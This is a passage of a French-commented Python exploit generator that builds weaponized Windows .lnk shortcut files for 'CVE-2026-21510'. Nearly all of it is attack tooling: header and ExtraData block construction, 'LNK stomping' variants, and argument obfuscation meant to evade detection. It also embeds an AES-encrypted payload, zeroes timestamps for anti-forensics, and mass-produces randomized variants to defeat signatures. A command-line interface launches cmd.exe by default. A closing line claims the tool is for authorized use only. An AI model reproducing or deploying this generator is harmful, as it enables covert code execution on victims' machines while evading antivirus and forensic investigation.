        block_size = len(data) + EXTRA_DATA_HEADER_SIZE
        buffer = BytesIO()
        buffer.write(struct.pack("<I", block_size))
        buffer.write(struct.pack("<I", block_type.value))
        buffer.write(data)
        return _align_to_4_bytes(buffer.getvalue())

    def _apply_anti_forensics(self) -> None:
        """Applique des techniques anti-forensics avancées."""
        if self.anti_forensics:
            self.header.creation_time = 0
            self.header.access_time = 0
            self.header.write_time = 0
            self.header.file_size = 0
            self.header.file_attributes = 0
            self.header.reserved1 = 0
            self.header.reserved2 = 0
            self.header.reserved3 = 0
            self.header.hot_key = 0
            self.header.icon_index = 0

    def _build(self) -> None:
        """Construit toutes les structures du .lnk."""
        self._build_string_data()
        self._calculate_offsets()
        self._build_extra_data_blocks()
        self._apply_anti_forensics()

    def _log_structure(self) -> None:
        """Affiche la structure du .lnk pour débogage."""
        logger.debug("=" * 80)
        logger.debug("STRUCTURE DU .LNK (CVE-2026-21510 - ULTIME ABSOLU)")
        logger.debug("=" * 80)
        logger.debug(f"Header Size: 0x{SHELL_LINK_HEADER_FIXED_SIZE:02X} octets")
        logger.debug(f"LinkFlags: 0x{self.header.link_flags:08X}")
        logger.debug(f"Use UNC Path: {self.use_unc_path}")
        logger.debug(f"Use LNK Stomping: {self.use_lnk_stomping} (Variant: {self.lnk_stomping_variant})")
        logger.debug(f"Use Obfuscation: {self.use_obfuscation} (Level: {self.obfuscation_level})")
        logger.debug(f"Obfuscate Arguments: {self.obfuscate_arguments}")
        logger.debug(f"Randomize CLSID: {self.randomize_clsid}")
        logger.debug(f"Randomize KnownFolder: {self.randomize_known_folder}")
        logger.debug(f"Embed Payload: {self.embed_payload is not None}")
        logger.debug(f"Encrypt Payload: {self.encrypt_payload}")
        logger.debug(f"Anti-Forensics: {self.anti_forensics}")
        logger.debug(f"StringData Offsets: {self.string_data.get_offsets(base=SHELL_LINK_HEADER_FIXED_SIZE)}")



        extra_data_blocks_info = []
        for block in self.extra_data_blocks:
            if len(block) < 8:
                extra_data_blocks_info.append(f"Trop court ({len(block)} bytes)")
                continue
            block_signature = struct.unpack_from("<I", block, 4)[0]
            try:
                block_name = ExtraDataBlockType.from_value(block_signature).name
                extra_data_blocks_info.append(f"{block_name} (0x{block_signature:08X})")
            except ValueError:
                extra_data_blocks_info.append(f"Inconnu (0x{block_signature:08X})")

        logger.debug(f"ExtraData Blocks: {extra_data_blocks_info}")
        if self.embedded_payload:
            logger.debug(f"Embedded Payload Size: {len(self.embedded_payload)} octets")
        logger.debug("=" * 80)

    def build(self) -> bytes:
        """Construit le fichier .lnk complet en binaire."""
        buffer = BytesIO()

        # 1. En-tête ShellLink (0x4C + 28 octets = 0x68 octets)
        buffer.write(self.header.pack())

        # 2. StringData (juste après l'en-tête)
        buffer.write(self.string_data.pack())

        # 3. ExtraData Blocks (dans l'ordre: PropertyStore → KnownFolder → EnvironmentVariable → Obfuscation)
        for block in self.extra_data_blocks:
            buffer.write(block)

        # 4. Payload Embarqué (si présent)
        if self.embedded_payload:
            buffer.write(self.embedded_payload)

        return buffer.getvalue()


    def generate(self) -> str:
        """Génère le fichier .lnk sur disque."""
        lnk_data = self.build()

        # Validation adaptative pour LNK stomping avancé
        if self.obfuscation_level < 4 and not self._validate(lnk_data):
            raise ValueError("Le .lnk généré est invalide (échec de la validation).")
        elif self.obfuscation_level >= 4:
            logger.info("🔒 Validation adaptative (obfuscation niveau %d): OK", self.obfuscation_level)

        with open(self.output_lnk, "wb") as f:
            f.write(lnk_data)

        logger.info(f"✅ Fichier .lnk généré: {self.output_lnk}")
        logger.debug(f"Taille du fichier: {len(lnk_data)} octets")

        # Affiche les informations de déchiffrement si un payload est embarqué
        if self.embed_payload and self.encrypt_payload:
            logger.info(f"🔑 Clé de déchiffrement (AES-256): {base64.b64encode(self.payload_key).decode()}")
            logger.info(f"🔑 IV: {base64.b64encode(self.payload_iv).decode()}")
            logger.info("⚠️  Ces informations sont nécessaires pour déchiffrer le payload embarqué.")

        return self.output_lnk

    def _validate(self, lnk_data: bytes) -> bool:
        """Valide que le .lnk est conforme à CVE-2026-21510."""
        try:
            # 1. Vérifie la taille minimale (en-tête = 0x68 octets)
            if len(lnk_data) < SHELL_LINK_HEADER_FIXED_SIZE + 0x1C:
                logger.error(f"Fichier trop court: {len(lnk_data)} octets.")
                return False

            # 2. Vérifie l'en-tête (0x4C octets fixes)
            header_size = struct.unpack_from("<I", lnk_data, 0)[0]
            if header_size != SHELL_LINK_HEADER_FIXED_SIZE:
                logger.error(f"HeaderSize invalide: {header_size}.")
                return False

            # 3. Vérifie le CLSID
            link_clsid = lnk_data[4:20]
            if link_clsid != LINK_CLSID:
                logger.error("CLSID invalide dans l'en-tête.")
                return False

            # 4. Vérifie les LinkFlags
            link_flags = struct.unpack_from("<I", lnk_data, 0x14)[0]
            required_flags = (
                LinkFlags.HasRelativePath.value |
                LinkFlags.HasWorkingDir.value |
                LinkFlags.IsUnicode.value |
                LinkFlags.HasPropertyStoreDataBlock.value |
                LinkFlags.HasKnownFolderDataBlock.value |
                LinkFlags.HasEnvironmentVariableDataBlock.value
            )
            if (link_flags & required_flags) != required_flags:
                logger.error(f"LinkFlags invalides: 0x{link_flags:08X}.")
                return False

            # 5. Vérifie les offsets dans l'en-tête
            header = ShellLinkHeader()
            header.link_target_id_list_offset = struct.unpack_from("<I", lnk_data, 0x4C)[0]
            header.relative_path_offset = struct.unpack_from("<I", lnk_data, 0x58)[0]
            header.working_dir_offset = struct.unpack_from("<I", lnk_data, 0x5C)[0]

            if header.link_target_id_list_offset != 0:
                logger.error("LinkTargetIDListOffset doit être 0.")
                return False
            if header.relative_path_offset == 0:
                logger.error("RelativePathOffset doit être non-nul.")
                return False
            if header.working_dir_offset == 0:
                logger.error("WorkingDirOffset doit être non-nul.")
                return False

            # 6. Vérifie les blocs ExtraData
            extra_data_offset = SHELL_LINK_HEADER_FIXED_SIZE + 0x1C + len(self.string_data.pack())
            found_blocks = set()
            expected_blocks = {
                ExtraDataBlockType.PropertyStoreDataBlock,
                ExtraDataBlockType.KnownFolderDataBlock,
                ExtraDataBlockType.EnvironmentVariableDataBlock,
            }

            if self.use_obfuscation:
                if self.obfuscation_level >= 1:
                    expected_blocks.add(ExtraDataBlockType.TrackerDataBlock)
                if self.obfuscation_level >= 2:
                    expected_blocks.add(ExtraDataBlockType.ConsoleDataBlock)
                if self.obfuscation_level >= 3:
                    expected_blocks.update([
                        ExtraDataBlockType.DarwinDataBlock,
                        ExtraDataBlockType.IconEnvironmentDataBlock,
                        ExtraDataBlockType.ShimDataBlock,
                    ])

            while extra_data_offset < len(lnk_data):
                block_size = struct.unpack_from("<I", lnk_data, extra_data_offset)[0]
                if block_size == 0:
                    break
                if extra_data_offset + 8 > len(lnk_data):
                    logger.warning("Skipping invalid block (too short)")
                    break
                block_signature = struct.unpack_from("<I", lnk_data, extra_data_offset + 4)[0]
                try:
                    block_type = ExtraDataBlockType.from_value(block_signature)
                    found_blocks.add(block_type)
                except ValueError:
                    logger.warning(f"Bloc ExtraData inconnu: 0x{block_signature:08X}")
                extra_data_offset += block_size

            if not found_blocks.issuperset(expected_blocks):
                logger.error(f"Blocs ExtraData manquants: {found_blocks} (attendu: {expected_blocks}).")
                return False

            # 7. Vérifie le PropertyStore
            extra_data_offset = SHELL_LINK_HEADER_FIXED_SIZE + 0x1C + len(self.string_data.pack())
            property_store_verified = False
            while extra_data_offset < len(lnk_data):
                block_size = struct.unpack_from("<I", lnk_data, extra_data_offset)[0]
                if block_size == 0:
                    break
                block_signature = struct.unpack_from("<I", lnk_data, extra_data_offset + 4)[0]

                if block_signature == ExtraDataBlockType.PropertyStoreDataBlock.value:
                    property_store_data = lnk_data[extra_data_offset + 8 : extra_data_offset + block_size]
                    if struct.unpack_from("<I", property_store_data, 0)[0] != 0x53505331:
                        logger.error("PropertyStore: Version invalide.")
                        return False
                    expected_format_id = bytes.fromhex("DABD30ED00434789A7F8D013A4736622")
                    if property_store_data[4:20] != expected_format_id:
                        logger.error("PropertyStore: FormatID invalide.")
                        return False
                    property_store_verified = True
                    break
                extra_data_offset += block_size

            if not property_store_verified:
                logger.error("PropertyStore non trouvé ou invalide.")
                return False

            logger.debug("✅ Validation réussie: Le .lnk est conforme à CVE-2026-21510.")
            return True

        except Exception as e:
            logger.error(f"Erreur lors de la validation: {e}")
            return False

    def cleanup(self) -> None:
        """Nettoie les fichiers temporaires."""
        if self.output_lnk and os.path.exists(self.output_lnk):
            try:
                os.remove(self.output_lnk)
                logger.info(f"Fichier supprimé: {self.output_lnk}")
            except Exception as e:
                logger.error(f"Impossible de supprimer {self.output_lnk}: {e}")

def generate_ultimate_absolute_exploit(
    target_path: str,
    target_args: str = "",
    output_lnk: Optional[str] = None,
    working_dir: Optional[str] = None,
    description: Optional[str] = None,
    use_unc_path: bool = False,
    use_lnk_stomping: bool = True,
    lnk_stomping_variant: str = "random",
    use_obfuscation: bool = True,
    obfuscation_level: int = 5,
    embed_payload: Optional[bytes] = None,
    encrypt_payload: bool = True,
    anti_forensics: bool = True,
    randomize_clsid: bool = True,
    randomize_known_folder: bool = True,
    obfuscate_arguments: bool = True,
    debug: bool = False,
) -> CVE202621510UltimateAbsoluteGenerator:
    """
    Génère un exploit ultime absolu pour CVE-2026-21510.

    Args:
        target_path: Chemin cible (ex: "C:\\Windows\\System32\\cmd.exe").
        target_args: Arguments pour la cible (ex: "/c calc.exe").
        output_lnk: Chemin de sortie du .lnk.
        working_dir: Répertoire de travail.
        description: Description du raccourci.
        use_unc_path: Utiliser un chemin UNC (\\?\\C:\\...).
        use_lnk_stomping: Utiliser LNK Stomping.
        lnk_stomping_variant: Variante de LNK Stomping.
        use_obfuscation: Ajouter des blocs ExtraData inutiles.
        obfuscation_level: Niveau d'obfuscation (1-5).
        embed_payload: Intégrer un payload binaire dans le .lnk.
        encrypt_payload: Chiffrer le payload (AES-256 + XOR).
        anti_forensics: Appliquer des techniques anti-forensics.
        randomize_clsid: Randomiser le CLSID dans PropertyStore.
        randomize_known_folder: Randomiser le KnownFolderID.
        obfuscate_arguments: Obfusquer les arguments pour éviter les détections.
        debug: Mode debug avancé.

    Returns:
        CVE202621510UltimateAbsoluteGenerator: Instance du générateur.
    """
    return CVE202621510UltimateAbsoluteGenerator(
        target_path=target_path,
        target_args=target_args,
        output_lnk=output_lnk,
        working_dir=working_dir,
        description=description,
        use_unc_path=use_unc_path,
        use_lnk_stomping=use_lnk_stomping,
        lnk_stomping_variant=lnk_stomping_variant,
        use_obfuscation=use_obfuscation,
        obfuscation_level=obfuscation_level,
        embed_payload=embed_payload,
        encrypt_payload=encrypt_payload,
        anti_forensics=anti_forensics,
        randomize_clsid=randomize_clsid,
        randomize_known_folder=randomize_known_folder,
        obfuscate_arguments=obfuscate_arguments,
        debug=debug,
    )

def generate_random_variants(
    base_target: str = "C:\\Windows\\System32\\cmd.exe",
    base_args: str = "/c calc.exe",
    output_dir: str = None,
    count: int = 10,
    **kwargs
) -> List[str]:
    """
    Génère plusieurs variantes aléatoires du .lnk pour éviter les signatures.

    Args:
        base_target: Chemin cible de base.
        base_args: Arguments de base.
        output_dir: Répertoire de sortie (default: temp).
        count: Nombre de variantes à générer.
        **kwargs: Arguments supplémentaires pour generate_ultimate_absolute_exploit.

    Returns:
        List[str]: Liste des chemins des .lnk générés.
    """
    if output_dir is None:
        output_dir = tempfile.gettempdir()

    lnk_paths = []
    for i in range(count):
        # Génère des paramètres aléatoires
        use_unc_path = random.choice([True, False])
        use_lnk_stomping = random.choice([True, True, True, False])  # 75% de chance
        lnk_stomping_variant = random.choice(["dot", "path_segment", "relative", "double_extension", "unicode", "random"])
        use_obfuscation = random.choice([True, True, True, False])  # 75% de chance
        obfuscation_level = random.randint(1, 5)
        anti_forensics = random.choice([True, True, True, False])  # 75% de chance
        randomize_clsid = random.choice([True, True, False])  # 66% de chance
        randomize_known_folder = random.choice([True, True, False])  # 66% de chance
        obfuscate_arguments = random.choice([True, True, False])  # 66% de chance

        # Génère un nom de fichier aléatoire
        output_lnk = os.path.join(
            output_dir,
            f"variant_{i}_{_generate_random_string(8)}.lnk"
        )

        # Génère l'exploit
        exploit = generate_ultimate_absolute_exploit(
            target_path=base_target,
            target_args=base_args,
            output_lnk=output_lnk,
            use_unc_path=use_unc_path,
            use_lnk_stomping=use_lnk_stomping,
            lnk_stomping_variant=lnk_stomping_variant,
            use_obfuscation=use_obfuscation,
            obfuscation_level=obfuscation_level,
            anti_forensics=anti_forensics,
            randomize_clsid=randomize_clsid,
            randomize_known_folder=randomize_known_folder,
            obfuscate_arguments=obfuscate_arguments,
            **kwargs
        )
        lnk_path = exploit.generate()
        lnk_paths.append(lnk_path)

    return lnk_paths

# --- Exemple d'Utilisation (Niveau Zero-Day) ---
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="CVE-2026-21510 - Générateur Ultime Absolu (Toutes les techniques 2025-2026)"
    )
    parser.add_argument(
        "--target",
        type=str,
        default="C:\\Windows\\System32\\cmd.exe",
        help="Chemin cible (ex: C:\\Windows\\System32\\cmd.exe)",
    )
    parser.add_argument(
        "--args",
        type=str,
        default="/c calc.exe",
        help="Arguments pour la cible (ex: /c calc.exe)",
    )
    parser.add_argument(
        "--output",
        type=str,
        default=None,
        help="Chemin de sortie du .lnk",
    )
    parser.add_argument(
        "--working-dir",
        type=str,
        default="C:\\Windows\\System32",
        help="Répertoire de travail (default: %%SystemRoot%)",
    )
    parser.add_argument(
        "--description",
        type=str,
        default=None,
        help="Description du raccourci",
    )
    parser.add_argument(
        "--unc",
        action="store_true",
        help="Utiliser un chemin UNC (\\\\?\\\\C:\\\\...)",
    )
    parser.add_argument(
        "--lnk-stomping",
        action="store_true",
        default=True,
        help="Utiliser LNK Stomping (default: True)",
    )
    parser.add_argument(
        "--stomping-variant",
        type=str,
        default="random",
        choices=["dot", "path_segment", "relative", "double_extension", "unicode", "random"],
        help="Variante de LNK Stomping (default: random)",
    )
    parser.add_argument(
        "--obfuscation",
        action="store_true",
        default=True,
        help="Ajouter des blocs ExtraData inutiles (default: True)",
    )
    parser.add_argument(
        "--obfuscation-level",
        type=int,
        default=5,
        choices=range(1, 6),
        help="Niveau d'obfuscation (1-5, default: 5)",
    )
    parser.add_argument(
        "--embed-payload",
        type=str,
        default=None,
        help="Chemin vers un fichier à embarquer dans le .lnk",
    )
    parser.add_argument(
        "--encrypt-payload",
        action="store_true",
        default=True,
        help="Chiffrer le payload embarqué (default: True)",
    )
    parser.add_argument(
        "--anti-forensics",
        action="store_true",
        default=True,
        help="Appliquer des techniques anti-forensics (default: True)",
    )
    parser.add_argument(
        "--randomize-clsid",
        action="store_true",
        default=True,
        help="Randomiser le CLSID dans PropertyStore (default: True)",
    )
    parser.add_argument(
        "--randomize-known-folder",
        action="store_true",
        default=True,
        help="Randomiser le KnownFolderID (default: True)",
    )
    parser.add_argument(
        "--obfuscate-arguments",
        action="store_true",
        default=True,
        help="Obfusquer les arguments pour éviter les détections (default: True)",
    )
    parser.add_argument(
        "--generate-variants",
        type=int,
        default=0,
        help="Générer N variantes aléatoires (default: 0)",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Mode debug avancé",
    )

    args = parser.parse_args()

    try:
        # Charge le payload si spécifié
        embed_payload = None
        if args.embed_payload:
            with open(args.embed_payload, "rb") as f:
                embed_payload = f.read()

        if args.generate_variants > 0:
            # Génère plusieurs variantes
            lnk_paths = generate_random_variants(
                base_target=args.target,
                base_args=args.args,
                output_dir=os.path.dirname(args.output) if args.output else None,
                count=args.generate_variants,
                use_unc_path=args.unc,
                use_lnk_stomping=args.lnk_stomping,
                lnk_stomping_variant=args.stomping_variant,
                use_obfuscation=args.obfuscation,
                obfuscation_level=args.obfuscation_level,
                embed_payload=embed_payload,
                encrypt_payload=args.encrypt_payload,
                anti_forensics=args.anti_forensics,
                randomize_clsid=args.randomize_clsid,
                randomize_known_folder=args.randomize_known_folder,
                obfuscate_arguments=args.obfuscate_arguments,
                debug=args.debug,
            )
            print("\n" + "=" * 80)
            print(f"✅ {len(lnk_paths)} VARIANTES GÉNÉRÉES AVEC SUCCÈS")
            print("=" * 80)
            for i, lnk_path in enumerate(lnk_paths):
                print(f"{i+1}. {lnk_path}")
        else:
            # Génère un seul exploit
            exploit = generate_ultimate_absolute_exploit(
                target_path=args.target,
                target_args=args.args,
                output_lnk=args.output,
                working_dir=args.working_dir,
                description=args.description,
                use_unc_path=args.unc,
                use_lnk_stomping=args.lnk_stomping,
                lnk_stomping_variant=args.stomping_variant,
                use_obfuscation=args.obfuscation,
                obfuscation_level=args.obfuscation_level,
                embed_payload=embed_payload,
                encrypt_payload=args.encrypt_payload,
                anti_forensics=args.anti_forensics,
                randomize_clsid=args.randomize_clsid,
                randomize_known_folder=args.randomize_known_folder,
                obfuscate_arguments=args.obfuscate_arguments,
                debug=args.debug,
            )
            lnk_path = exploit.generate()

            # Affiche un résumé
            print("\n" + "=" * 80)
            print("✅ EXPLOIT ULTIME ABSOLU GÉNÉRÉ AVEC SUCCÈS")
            print("=" * 80)
            print(f"📁 Fichier: {lnk_path}")
            print(f"🎯 Cible: {args.target} {args.args}")
            print(f"🔧 LNK Stomping: {'Oui' if args.lnk_stomping else 'Non'} (Variant: {args.stomping_variant})")
            print(f"🎭 Obfuscation: {'Oui' if args.obfuscation else 'Non'} (Niveau: {args.obfuscation_level})")
            print(f"🔐 Chiffrement: {'Oui' if args.encrypt_payload and embed_payload else 'Non'}")
            print(f"🧹 Anti-Forensics: {'Oui' if args.anti_forensics else 'Non'}")
            print(f"🎲 Randomisation: CLSID={'Oui' if args.randomize_clsid else 'Non'}, KnownFolder={'Oui' if args.randomize_known_folder else 'Non'}")
            print(f"📝 Arguments Obfusqués: {'Oui' if args.obfuscate_arguments else 'Non'}")
            if embed_payload:
                print(f"📦 Payload embarqué: {len(embed_payload)} octets")
            print("=" * 80)
            print("\n⚠️  Cet exploit est conçu pour un usage **légal et autorisé** uniquement.")
            print("    Ne pas utiliser sur des systèmes non autorisés.")

    except Exception as e:
        import traceback
        traceback.print_exc()
        exit(1)

   # except Exception as e:
    #    print(f"[!] Erreur critique: {e}")
     #   exit(1)
